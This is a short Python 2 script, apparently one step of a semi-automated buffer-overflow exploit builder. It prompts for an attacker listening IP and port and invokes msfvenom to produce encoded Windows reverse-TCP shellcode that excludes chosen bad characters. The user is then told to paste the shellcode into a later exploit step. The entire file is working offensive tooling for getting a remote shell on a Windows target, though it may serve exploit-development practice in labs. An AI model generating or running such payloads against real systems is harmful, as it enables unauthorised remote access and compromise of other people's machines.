#!/usr/bin/python2.7
null    = """
written by coolhandsquid
Bogas
Buffer Overflow Generater Automatic Semi
"""

import socket
import os

print """
Now we are going to make our encoded shellcode!
(You may want to go back to your kali for this)
I am going to ask you some questions and will print out the payload.
You will need to nano this script and spicify on line 17 the bad characters you previously identified.
You will then need to copy the payload (yes quotes, not the semi colon) and copy it into step 9.
"""
lhost	= raw_input("What is the listening host IP you would like to use?\n> ")
lport	= raw_input("What is the listening port you would like to use?\n> ")

###VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
badchar	= "\\x00\\x0a\\x0d"
###^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

#os.system('msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -f c -a x86 --platform windows -b {} -e x86/shikata_ga_nai'.format(lhost, lport, badchar))

os.system('msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -f c -a x86 --platform windows -b {} -e x86/alpha_upper'.format(lhost, lport, badchar))

